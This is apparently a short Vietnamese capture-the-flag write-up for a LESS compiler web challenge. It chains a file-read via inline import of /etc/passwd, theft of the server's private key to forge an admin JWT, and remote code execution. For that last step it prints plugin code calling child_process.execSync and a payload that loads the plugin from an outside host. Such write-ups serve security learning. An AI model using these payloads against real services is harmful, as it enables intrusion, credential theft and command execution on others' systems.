# research3

## Ý tưởng 

Less compiler -> LFI -> đọc privatekey -> gen lại jwt token để lên admin -> rce đọc flag

## Solve

Challenge sẽ là công cụ LESS Decompiler

Đăng kí tài khoản user thường

User thường có thể sử dụng `import (inline) "/etc/passwd";` để LFI

![](https://i.imgur.com/pADpE7h.png)

Đọc các file của server

Phân tích file `src/index.js`

![](https://i.imgur.com/fSHA4Vb.png)

Để sử dụng `@plugin` thì ta sẽ phải truy cập được vào tài khoản admin

File `private.key` để lộ và ta có thể đọc được lợi dụng lỗ hổng để gen lại token jwt cho username

Khi lên được admin ta có thể chèn được plugin và thực hiện rce

less.js

```js
// less.js
functions.add('cmd', val => {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```

payload:

```js
@plugin "https://static.hypnguyen.com/less";
body {
    color: cmd('cat /flag*');
}
```

Thang điểm: 300/500
